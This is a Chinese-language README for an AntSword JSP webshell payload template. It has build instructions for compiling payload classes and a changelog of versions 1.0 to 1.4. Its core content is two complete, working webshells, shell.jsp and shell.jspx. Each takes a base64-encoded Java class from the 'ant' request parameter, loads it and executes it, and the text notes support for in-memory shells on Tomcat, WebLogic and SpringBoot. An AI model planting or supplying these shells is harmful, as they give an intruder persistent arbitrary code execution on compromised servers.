# AntSword-JSP-Template  v1.4
中国蚁剑JSP一句话Payload

详细介绍：https://yzddmr6.tk/posts/antsword-diy-3/

编译环境：jdk6 + tomcat7

适用范围：jdk6及以上

## 编译

### 手动编译

```
javac -cp "D:/xxxx/lib/servlet-api.jar;D:/xxx/lib/jsp-api.jar" Test.java

base64 -w 0 Test.class > Test.txt
```

### 自动编译

在build.py/build.sh中替换你的javac路径后运行，即可在`./dist`目录下自动生成代码模板。

Windows

```
python3 build.py
```

Linux/Mac os

```
./build.sh
```

## Shell
shell.jsp

```
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("ant");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```

shell.jspx
```
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
    <jsp:declaration>
        class U extends ClassLoader {
            U(ClassLoader c) {
                super(c);
            }
            public Class g(byte[] b) {
                return super.defineClass(b, 0, b.length);
            }
        }
        public byte[] base64Decode(String str) throws Exception {
            try {
                Class clazz = Class.forName("sun.misc.BASE64Decoder");
                return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
            } catch (Exception e) {
                Class clazz = Class.forName("java.util.Base64");
                Object decoder = clazz.getMethod("getDecoder").invoke(null);
                return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
            }
        }
    </jsp:declaration>
    <jsp:scriptlet>
        String cls = request.getParameter("ant");
        if (cls != null) {
            new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
        }
    </jsp:scriptlet>
</jsp:root>
```
其中`pageContext`可以替换为`request`，以实现对内存Webshell的兼容。

## 更新日志

### v 1.4

1. 兼容JDK6
2. 兼容weblogic内存webshell
3. 优化报错信息
4. 解决windows下中文乱码的问题
5. 不再支持response作为入口参数
6. 增加用于测试的Web项目

### v 1.3

1. 兼容SpringBoot

### v 1.2

1. 修复下载文件的BUG
2. database添加Base64编码

### v 1.1

1. 增加对Tomcat内存Webshell的兼容
2. 兼容高版本JDK（JDK7-14）

### v 1.0

1. release
